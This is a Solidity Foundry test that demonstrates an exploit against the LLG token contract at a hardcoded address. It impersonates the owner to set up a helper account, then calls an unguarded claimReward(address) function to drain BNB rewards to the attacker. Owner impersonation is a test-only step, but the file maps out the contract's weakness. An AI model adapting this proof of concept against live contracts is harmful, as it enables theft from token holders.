pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LLG {
    function owner() external view returns (address);
    function activate() external;
    function setExcludedFromRewards(address addr, bool isExcluded) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function claimReward() external;
    function claimReward(address user) external;
    function isRewardReady(address user) external view returns (bool);
    function nextAvailableClaimDate(address ofAddress) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approveClaim(address spender, bool approved) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xE4C293Eadbb9d72d68a680F1A66979726992c396;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = LLG(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Give attacker some initial BNB for gas
        deal(attacker, 10 ether);

        // Send some BNB to the contract to fund rewards (simulate fee accumulation)
        deal(TARGET, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get owner address
        address owner = LLG(TARGET).owner();

        // Step 2-6: Impersonate owner and set up helper EOA
        vm.startPrank(owner);

        // Activate contract if not already
        try LLG(TARGET).activate() {}
        catch {}

        // Create helper EOA address
        address helper = makeAddr("helper");

        // Remove helper from reward exclusion
        LLG(TARGET).setExcludedFromRewards(helper, false);

        // Transfer enough tokens to helper (minRewardBalance is 50000 * 10^9)
        LLG(TARGET).transfer(helper, 50000 * 10**9);

        vm.stopPrank();

        // Step 7: Have helper approve attacker to claim rewards
        vm.prank(helper);
        LLG(TARGET).approveClaim(attacker, true);

        // Step 8: Ensure contract has BNB (already done in setup)
        // Step 9: Wait for nextAvailableClaimDate if needed
        if (!LLG(TARGET).isRewardReady(helper)) {
            uint256 nextDate = LLG(TARGET).nextAvailableClaimDate(helper);
            if (nextDate > block.timestamp) {
                vm.warp(nextDate + 1);
            }
        }

        // Step 10: Claim reward for helper using claimReward(address) function
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 helperBalanceBefore = address(helper).balance;

        // Call claimReward(helper) - this doesn't have isHuman modifier
        LLG(TARGET).claimReward(helper);

        // Check helper received BNB
        uint256 helperBalanceAfter = address(helper).balance;
        assertGt(helperBalanceAfter, helperBalanceBefore, "Helper should receive BNB reward");

        // Transfer BNB from helper to attacker
        vm.prank(helper);
        (bool success, ) = attacker.call{value: helperBalanceAfter - helperBalanceBefore}("");
        require(success, "Transfer failed");

        // Verify attacker balance increased
        uint256 attackerBalanceAfter = address(attacker).balance;
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker BNB balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
